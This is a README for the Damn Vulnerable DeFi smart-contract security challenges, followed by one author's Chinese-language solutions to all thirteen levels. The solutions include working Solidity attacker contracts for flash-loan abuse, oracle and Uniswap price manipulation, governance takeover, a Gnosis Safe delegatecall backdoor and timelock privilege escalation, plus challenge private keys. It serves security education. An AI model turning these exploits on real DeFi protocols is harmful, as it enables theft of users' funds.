![](cover.png)

**A set of challenges to learn offensive security of smart contracts in Ethereum.**

Featuring flash loans, price oracles, governance, NFTs, lending pools, smart contract wallets, timelocks, and more!

## Play

Visit [damnvulnerabledefi.xyz](https://damnvulnerabledefi.xyz)

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

DO NOT USE IN PRODUCTION.

## Solution

### 1.Unstoppalble

该挑战的目标是停止pool合约的闪电贷功能。
可以发现pool合约在闪电贷前有一条安全检查assert(poolBalance == balanceBefore)用以检测池中记录的DVT和代币balanceof()返回的是否一致，因此只需要给pool合约存点代币即可完成该挑战。

### 2.Naive receiver
该挑战的目标是耗尽闪电贷Receiver里的ETH。

可以发现pool在闪电贷中并没有指定borrower==msg.sender，也没做检查，因此可以代receiver发起闪电贷，直至耗尽Receiver的ETH
我实现了一个攻击函数来发起攻击直至耗尽receiver的ETH，这样就实现了挑战中的附加条件（在一个交易内耗尽合约ETH）。

    function attack() public {
    uint256 amount = IToken(token).balanceOf(pool);
    
            IPool(pool).flashLoan(0, msg.sender, token, abi.encodeWithSignature(
                    "approve(address,uint256)",
                    address(this),
                    amount
                ));
    
            IToken(token).transferFrom(pool, msg.sender, amount);
        }


### 3.Truster
该挑战的目标是通过一个交易将一个闪电贷pool里的DVT全部提取出来。

可以发现这个pool直接使用target.functionCall(data)调用外部函数，攻击者可以调用任意函数。因此攻击者可以通过闪电贷传入代币的approve函数签名作为data，aaprove pool所有DVT给自己，再将代币提取出来,即可完成目标。


    function attack() public {
    uint256 amount = IToken(token).balanceOf(pool);
            IPool(pool).flashLoan(0, msg.sender, token, abi.encodeWithSignature(
                    "approve(address,uint256)",
                    address(this),
                    amount
                ));
            IToken(token).transferFrom(pool, msg.sender, amount);
        }

### 4.Side Entrance
该挑战的目标是将一个闪电贷pool里的ETH全部提取出来。

观察pool合约，可以看到pool的flashLoan()调用了用了接收者的execute()并附带借贷的ETH进行发送，最后仅仅检查pool的address(this).balance >= balanceBefore通过即可完成闪电贷。因此有了一个大致攻击的思路：利用闪电贷重入自己的代码并满足上述条件进行套利。同时发现pool有deposit()函数可以存入ETH，withdraw()函数可以取出ETH。
因此攻击思路就显而易见了：攻击者首先在闪电贷中将借得的ETH在excute中存入该pool中，此步操作增加了攻击者在pool中的ETH存款的同时又能通过flashLoan的检查。然后将利用withdraw()即可将ETH从pool中提取出来，完成一次攻击。
   
     contract SideEntranceAttacker {

        address private pool;
      
        constructor(address poolAddress) {
            pool = poolAddress;
        }
    
        function execute() external payable{
            IPool(pool).deposit{value:msg.value}();
        }
    
        function attack() public {
            uint256 amount = pool.balance;
            IPool(pool).flashLoan(amount);
            IPool(pool).withdraw();
            address payable receiver = payable(msg.sender);
            receiver.transfer(amount);
        }
    
        receive() external payable {}
    
    }

### 5.The rewarder

该挑战的目标是尽可能地在奖励池的下一个奖励回合中捞取其奖励代币。

该挑战是个典型的闪电贷攻击挑战，而且还很贴心的告诉你这里有个闪电贷池子。奖励池的奖励分配规则是按照每个人存入的DVT占总存入额的百分比进行奖励分配。因此思路就很明晰了：在下一个奖励回合到来的时候利用闪电贷借出大额资金（闪电贷池子所有资金），将其注入奖励池中，获得大部分奖励后归还资金，即可完成挑战。
    
    function receiveFlashLoan(uint256 amount) external {
        IToken(dvt).approve(rewardPool,amount);
        RewardPool(rewardPool).deposit(amount);
        RewardPool(rewardPool).withdraw(amount);
        require(IToken(rewardToken).balanceOf(address(this)) >= 99 ether,"reward token low!");
        IToken(dvt).transfer(flashLoanPool,amount);
        }
    
    function attack() public {
        uint256 amount = IToken(dvt).balanceOf(flashLoanPool);
        FlashLoanPool(flashLoanPool).flashLoan(amount);
        uint256 reward = IToken(rewardToken).balanceOf(address(this));
        IToken(rewardToken).transfer(msg.sender,reward);
    }

### 6.Selfie

该挑战的目标是通过pool的管理机制来提走pool中的所有dvt。

该挑战包含两个合约：pool合约提供dvt进行闪电贷，而goverance合约以dvt作为治理代币，并且只有持有超过一半dvt总供应量者能提出提案，并在两天后可被执行。和5类似，通过pool的闪电贷可以使攻击者短时间成为governance的巨鲸，从而获得提案权，并提出调用pool的drainAllFunds(address)将所有资金转给攻击者的提案。这样在两天后攻击者就可以执行提案并把pool的所有资金提取出来了。
    
    function receiveTokens(address tokenAddress, uint256 tokenAmount) external {
        dvt.snapshot();
        actionId = governance.queueAction(address(pool), abi.encodeWithSignature(
        "drainAllFunds(address)",
        receiver
        ), 0);
        dvt.transfer(address(pool), tokenAmount);
    }
    
    function prepare() external {
        pool.flashLoan(dvt.balanceOf(address(pool)));
    }
    
    function attack() external {
        governance.executeAction(actionId);
    }

### 7.Compromised

挑战目标是将NFT交易所里的所有ETH提取出来。

这个我确实不会，看了题解在做的。这个是是个私钥泄露漏洞。题目中给出了两串代码，是两串私钥的十六进制数据，我们将其连接，转换成base64编码数据即可得到私钥：
    
    const privateKey = [
        '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48',
        '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9'
        ];

exchange的价格预言机依赖于三个价格source，并且价格取自于所有source给出价格的从小到大排序后的中位数，因此我们知道了其中两个私钥就可以操纵NFT的价格。由于我们已经知道了其中两个soucre的私钥，那么我们就可以调用价格预言机的函数，将NFT价格置为0，然后买入。之后再将价格置为exchange的ETH存量，将NFT卖出，从而达到把NFT交易所里所有ETH提取出来的目的。

    const privateKey = [
    '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48',
    '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9'
    ];

交易过程：
    
    //create wallet of private key
    let wallet = [new ethers.Wallet(privateKey[0],ethers.provider),new ethers.Wallet(privateKey[1],ethers.provider)];
    //get oracle include signature
    let sigOracle = [this.oracle.connect(wallet[0]),this.oracle.connect(wallet[1])];
    //change NFT price to zero
    for (let i = 0; i < 2; i++) {
    await sigOracle[i].postPrice("DVNFT", 0);
    }
    let sigExchange = this.exchange.connect(attacker);
    //buy 1 NFT of 0ETH
    tx = await sigExchange.buyOne({value:1});
    await this.exchange.on("TokenBought", async (sender, tokenId, currentPriceInWei) =>{
    //change NFT price to exchange's balance
    let amount = await ethers.provider.getBalance(sigExchange.address);
    for (let i = 0; i < 2; i++) {
    await sigOracle[i].postPrice("DVNFT", amount);
    }
    
    //approve 1 DVNFT transferFrom and sell it
    let sigToken = this.nftToken.connect(attacker);
    await sigToken.approve(sigExchange.address, tokenId);
    await sigExchange.sellOne(tokenId);
    
    //change balance to  initial price
    for (let i = 0; i < 2; i++) {
    await sigOracle[i].postPrice("DVNFT",INITIAL_NFT_PRICE);
    }
    });
    await tx.wait(2);

### 8.Puppet

该挑战的目标是抽干借贷池里的10万个DVT。

该借贷池依赖于一个非常容易攻击的价格预言机机制。该价格预言机基于uniswap V1池子中ETH和DVT存量，并以$2*\frac{ETH}{DVT}$作为DVT的借贷价格，因此我向uniswap发起swap交易，将池中的ETH和DVT分别变为0.1和1000枚，这样借贷池中DVT的价格就变成了2ETH/万枚，调用借贷池的borrow函数即可用20ETH将10万个DVT抽干。

    function attack() external payable{
        uint256 dvtAmount = dvt.balanceOf(address(this));
        dvt.approve(address(uniswap),dvtAmount);
        uniswap.tokenToEthSwapOutput(9.9 ether,dvtAmount,block.timestamp + 1000000);
        uint256 poolAmount = dvt.balanceOf(address(pool));
        pool.borrow{value:25 ether}(poolAmount);
        dvtAmount = dvt.balanceOf(address(this));
        dvt.transfer(msg.sender,dvtAmount);
    }

### 9.Puppet v2

该挑战和8类似，抽干新的借贷池的100万个DVT。

新的合约采用uniswap V2池子作为价格预言机，并使用了uniswap v2的libary！但是细看library的计价方式仍是换汤不换药，和8一样都是以池中的WETH和DVT存量做计算，并且并以$3*\frac{WETH}{DVT}$作为DVT的借贷价格。因此我们可以采用和8一样的方式，通过router把所有DVT兑换成WETH用以价格预言机操纵，并且在留下少数gas费后把ETH全换成WETH，并拿这些WETH去借贷池中借出所有DVT，即可完成挑战。

    function attack() external payable {
        uint256 dvtAmount = dvt.balanceOf(address(this));
        dvt.approve(address(router), dvtAmount);
        address[] memory paths= new address[](2);
        paths[0] = address(dvt);
        paths[1] = address(weth);
        router.swapExactTokensForTokens(dvtAmount, 0, paths, address(this), block.timestamp + 1000000);
        weth.deposit{value : 19.8 ether}();
        uint256 wethAmount = weth.balanceOf(address(this));
        weth.approve(address(pool), wethAmount);
        uint256 poolAmount = dvt.balanceOf(address(pool));
        pool.borrow(poolAmount);
        dvtAmount = dvt.balanceOf(address(this));
        dvt.transfer(msg.sender, dvtAmount);
    }

### 10.Free rider

该挑战的目标是将NFT市场中的所有NFT（6个）以小于买家付出的ETH获得，并将NFT转给买家的合约。

查看NFT市场合约，可以发现有这么一个漏洞：该合约在购买NFT时仅仅检查购买者发送的ETH数量是否大于单个NFT的价格，而不是购买者购买的所有NFT价格之和。因此我便可以以1个NFT的价格拿走市场上的6个NFT,从而实现套利。
然而由一开始我的ETH余额很少，甚至不够支付1个NFT的价格。因此我需要借助uniswap的闪电贷获得我的初始资金WETH，换成ETH，然后我就可以用1个NFT的价格买走6个NFT了。
这就结束了？当然没有，我还能利用这个漏洞抽干这个NFT市场的所有ETH！我只需要为这6个NFT分别以$\frac{NFTMarket.ETHbalance}{5}$的价格挂单，并且以上述价格买总计6个NFT，就可以把剩下的ETH全部提取出来。
之后这个NFT市场就没有利用价值了，我们只需要把这6个NFT转移给买家，并且把所有的ETH转移给自己的账户就可以超额通过这项挑战了。

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        weth.withdraw(BORROW_NUMBER);
        uint256[] memory tokenIds = new uint256[](6);
        uint256[] memory price = new uint256[](6);
        for (uint i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        NFT.setApprovalForAll(address (NFTMarket),true);
        NFTMarket.buyMany{value : NFT_PRICE}(tokenIds);
        uint nft_price = address(NFTMarket).balance / 5;
        for (uint i = 0; i < 6; i++) {
            price[i] = nft_price;
        }
        NFTMarket.offerMany(tokenIds,price);
        NFTMarket.buyMany{value : nft_price}(tokenIds);
        for (uint i = 0; i < 6; i++) {
            NFT.safeTransferFrom(address(this), NFTReceiver, tokenIds[i]);
        }
        weth.deposit{value : REPAY_NUMBER}();
        weth.transfer(address(uniswap), REPAY_NUMBER);
        require(payable(attacker).send(address(this).balance), "send final eth to attacker failed!");
    }

    function attack() external payable {
        uniswap.swap(BORROW_NUMBER, 0, address(this), new bytes(32));
    }

然而我漏掉了搭便车的真正漏洞：

    function _buyOne(uint256 tokenId) private {       
        uint256 priceToPay = offers[tokenId];
        require(priceToPay > 0, "Token is not being offered");
        
        require(msg.value >= priceToPay, "Amount paid is not enough");
    
        amountOfOffers--;
    
        // transfer from seller to buyer
        token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);
    
        // pay seller
        payable(token.ownerOf(tokenId)).sendValue(priceToPay);
    
        emit NFTBought(msg.sender, tokenId, priceToPay);
    }    
可以看到这个NFT市场在结算的时候，是先将NFT转移给买方，再给NFT所有者发送定价的ETH的。然而NFT转给买方以后，所有者就是买方了，相当于给买方NFT也给ETH，这也就是搭便车的真正含义。市场原本是要转钱给卖方的，但是由于顺序错误导致了失误。

### 11.Backdoor

挑战的目标是将多签钱包注册表上的所有DVT转到攻击者手上。

这应该是最难的一个挑战了，代码量很大并且涉及了我不是很了解的领域：智能钱包。
首先可以确定我需要自己帮这4个注册表上的用户创建钱包，并且在这个创建过程中留下可以把钱转走的后门，可以确定创建的函数是factory中的createProxyWithCallback：

    function createProxyWithCallback(address _singleton,bytes memory initializer,uint256 saltNonce,IProxyCreationCallback callback) public returns (GnosisSafeProxy proxy) {
    uint256 saltNonceWithCallback = uint256(keccak256(abi.encodePacked(saltNonce, callback)));
    proxy = createProxyWithNonce(_singleton, initializer, saltNonceWithCallback);
    if (address(callback) != address(0)) callback.proxyCreated(proxy, _singleton, initializer, saltNonce);
    }
该函数在创建钱包后，发送一个用户指定的交易给钱包，一般来说是钱包的setup来设置钱包，然后调用一个callback合约的proxyCreated。这里的callback合约即注册表合约，注册表合约会在这个函数中给创建好的多签钱包打10DVT，这个过程看起来唯一一个可以留后门的地方就是这个发送的setup了。
再来看看钱包的setup:

    function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver
        ) external {
        // setupOwners checks if the Threshold is already set, therefore preventing that this method is called twice
        setupOwners(_owners, _threshold);
        if (fallbackHandler != address(0)) internalSetFallbackHandler(fallbackHandler);
        // As setupOwners can only be called if the contract has not been initialized we don't need a check for setupModules
        setupModules(to, data);

        if (payment > 0) {
            // To avoid running into issues with EIP-170 we reuse the handlePayment function (to avoid adjusting code of that has been verified we do not adjust the method itself)
            // baseGas = 0, gasPrice = 1 and gas = payment => amount = (payment + 0) * 1 = payment
            handlePayment(payment, 0, 1, paymentToken, paymentReceiver);
        }
        emit SafeSetup(msg.sender, _owners, _threshold, to, fallbackHandler);
    }

可以发现最后有个handlePayment可以把钱包里的钱转给指定的人。然而先调用的setup后调用的createProxyWithCallback，所以没法把钱直接转出。而setupModules里可以delegatecall 指定to地址上的data逻辑，这个操作就是后门的关键：我可以在利用这个delegatecall ，在钱包上下文中执行指定的操作开个后门。因此我就可以让钱包把代币操作的权限approve给我，这样创建完以后，我就可以把代币直接转出了。

    contract BackdoorAttacker {
        IToken private dvt;
        IProxyFactory private factory;
        address private attacker;
        address[] private users;
        address private masterCopy;
        address private registry;
        uint256 constant GET_NUMBER = 10 ether;

    constructor(address factoryAddress, address tokenAddress,address masterCopyAddress,address registryAddress, address[] memory usersAddress) {
        dvt = IToken(tokenAddress);
        factory = IProxyFactory(factoryAddress);
        masterCopy = masterCopyAddress;
        registry = registryAddress;
        users = usersAddress;
    }

    function approve(address spender, address tokenAddress) external {
        IToken(tokenAddress).approve(spender, type(uint256).max);
    }

    function attack() external {
        for (uint256 i = 0; i < users.length; i++) {
            address user = users[i];
            address[] memory owner = new address[](1);
            owner[0] = user;
            bytes memory approveData = abi.encodeWithSignature("approve(address,address)", address(this), address(dvt));
            bytes memory setupData = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)",owner,1,address(this),approveData,address(0),address(0),0,address(0));
            GnosisSafeProxy proxy = factory.createProxyWithCallback(masterCopy,setupData,0,IProxyCreationCallback(registry));
            dvt.transferFrom(address(proxy),msg.sender,GET_NUMBER);
        }
    }



### 12. Climber
该挑战的目标是将金库里的所有1000万个DVT全部盗走。
看到题目climber，就意识到这是一个提权挑战。审查金库valut合约，可看出金库是一个UUPS的可升级合约，并且他有一个sweepFunds函数可以把所有代币提出来。但是这个函数的调用者sweeper并不能更改，因此可以看出来这个函数只是一个障眼法。那么还有什么方法呢？注意到这是个proxy合约，那么他的实现是可以变换的，因此我需要把自己在proxy的权限提升到onwer，并把实现换成我的合约逻辑，才可以把代币转出。
接下来审查valut的owner：timeLock合约，看看怎么把owner转给自己，毕竟修改owner的transferOnwership必须由owner函数发出。注意到execute:
    
    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
        ) external payable {
        require(targets.length > 0, "Must provide at least one target");
        require(targets.length == values.length);
        require(targets.length == dataElements.length);

        bytes32 id = getOperationId(targets, values, dataElements, salt);

        for (uint8 i = 0; i < targets.length; i++) {
            targets[i].functionCallWithValue(dataElements[i], values[i]);
        }
        
        require(getOperationState(id) == OperationState.ReadyForExecution);
        operations[id].executed = true;
    }
    有一个反编程习惯的做法：他先执行调用，做完之后才做检查。因此我们可以以这个函数为突破口来做提权，并绕过最后的require检查。
    timeLock需要先提出提案schedule（由proposer权限者提出），然后经过一个delay时间后，才能调用execute进行执行。因此包括我需要的transferOwnership，我需要execute以下四个操作：
1. 将delay时间修改为0。
2. 给attacker增加proposer权限。
3. 调用transferOwnership将valut的onwer权限转给attacker(提权操作）。
4. 将这四件事schedule给timeLock。（我们不能直接调用timeLock的schedule,这样我们无法编码dataElement里的数据，因此我们需要自己写一个schedule在攻击合约里，然后调用攻击合约的schedule）
   这样我们就完美地把自己提升为vault的owner，然后就可以为所欲为地把vault实现换成自己写的实现，并把代币转出了。


    contract ClimberAttacker {
    
       IToken private dvt;
       ITimeLock private timeLock;
       IVault private vault;
       TokenTransfer private tokenTransfer;
    
       constructor(address tokenAddress, address timeLockAddress, address vaultAddress) {
           dvt = IToken(tokenAddress);
           vault = IVault(vaultAddress);
           timeLock = ITimeLock(timeLockAddress);
           tokenTransfer = new TokenTransfer();
       }
    
       function schedule() external payable{
           address[] memory targets = new address[](4);
           targets[0] = address(timeLock);
           targets[1] = address(timeLock);
           targets[2] = address(vault);
           targets[3] = address(this);
           uint256[]  memory values = new uint256[](4);
           for (uint256 i = 0; i < 4; i++) {
           values[i] = 0;
           }
           bytes[] memory dataElements = new bytes[](4);
           dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)",uint64(0));
           dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)",keccak256("PROPOSER_ROLE"),address(this));
           dataElements[2] = abi.encodeWithSignature("transferOwnership(address)",address(this));
           dataElements[3] = abi.encodeWithSignature("schedule()");
           timeLock.schedule(targets,values,dataElements,keccak256("SALT"));
        }
    
       function attack() external {

            address attacker = msg.sender;
    
                address[] memory targets = new address[](4);
                targets[0] = address(timeLock);
                targets[1] = address(timeLock);
                targets[2] = address(vault);
                targets[3] = address(this);
                uint256[]  memory values = new uint256[](4);
                for (uint256 i = 0; i < 4; i++) {
                    values[i] = 0;
                }
            bytes[] memory dataElements = new bytes[](4);
            dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)",uint64(0));
            dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)",keccak256("PROPOSER_ROLE"),address(this));
            dataElements[2] = abi.encodeWithSignature("transferOwnership(address)",address(this));
            dataElements[3] = abi.encodeWithSignature("schedule()");
    
            timeLock.execute(targets,values,dataElements,keccak256("SALT"));
    
            vault.upgradeTo(address(tokenTransfer));
            vault.transfer(attacker,address(dvt));

      }

       receive() external payable {}
    }


    contract TokenTransfer is Initializable, OwnableUpgradeable, UUPSUpgradeable{
    
        uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
        uint256 public constant WAITING_PERIOD = 15 days;
    
        uint256 private _lastWithdrawalTimestamp;
        address private _sweeper;
    
        constructor() initializer {}
    
        function transfer(address spender, address tokenAddress) external {
            IToken(tokenAddress).transfer(spender, 10000000 ether);
        }
    
        function _authorizeUpgrade(address newImplementation) internal onlyOwner override {}

    }
### 13. Safe miners

该挑战的目标是把一个空地址的所有dvt转走。
由于本身不涉及合约相关，我查询了题解。题目说可以用一些先验知识，给出的信息只有几个地址。考虑用attacker的地址去部署合约，并用部署合约create合约，看看能不能碰撞出这个地址。实际情况是使用attacker部署的第2个地址上，certe的第66个地址即题目中的空地址，可以把代币转走。

    contract SafeMinerAttacker {
        constructor(address attacker, address dvtAddress, uint256 number) {
            for (uint256 idx; idx < number; idx++) {
                new TokenTransfer(attacker, dvtAddress);
            }
        }
    }
    contract TokenTransfer {
        constructor(address attacker, address dvtAddress) {
            IToken dvt = IToken(dvtAddress);
            uint256 balance = dvt.balanceOf(address(this));
            if (balance > 0) {
                dvt.transfer(attacker, balance);
            }
        }
    }


